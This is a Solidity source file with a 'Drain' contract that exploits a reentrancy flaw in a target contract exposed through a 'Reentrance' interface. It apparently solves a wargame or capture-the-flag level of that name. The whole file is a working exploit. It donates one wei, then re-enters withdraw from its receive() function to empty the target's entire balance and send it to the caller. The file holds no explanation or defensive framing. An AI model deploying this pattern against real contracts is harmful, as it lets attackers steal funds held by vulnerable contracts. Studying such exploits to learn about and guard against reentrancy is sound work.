// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface Reentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
  function balanceOf(address _who) external view returns (uint balance);
}


contract Drain {
    Reentrance immutable reentrance;
    bool internal isReentering;

    constructor(Reentrance _reentrance) payable {
        reentrance = _reentrance;
    }

    function drain() public payable {
        reentrance.donate{value: 1}(address(this));
        isReentering = true;
        reentrance.withdraw(1);
        reentrance.withdraw(address(reentrance).balance);
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        if(!isReentering) return;
        isReentering = false;
        reentrance.withdraw(reentrance.balanceOf(address(this)));
    }
}
